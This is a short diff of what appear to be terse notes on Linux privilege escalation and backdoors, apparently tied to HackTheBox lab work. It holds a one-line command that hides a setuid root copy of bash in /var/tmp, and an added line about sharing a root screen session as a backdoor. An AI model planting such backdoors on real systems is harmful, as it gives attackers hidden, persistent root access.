@@ -7,3 +7,7 @@ hide bash privilege escalate
  cp /bin/bash /var/tmp/.test; chown root:root /var/tmp/.test; chmod 4755 /var/tmp/.test
 ```
 
+screen backdoor   hackthebox backdoor   :   share root shell session
+
+
+
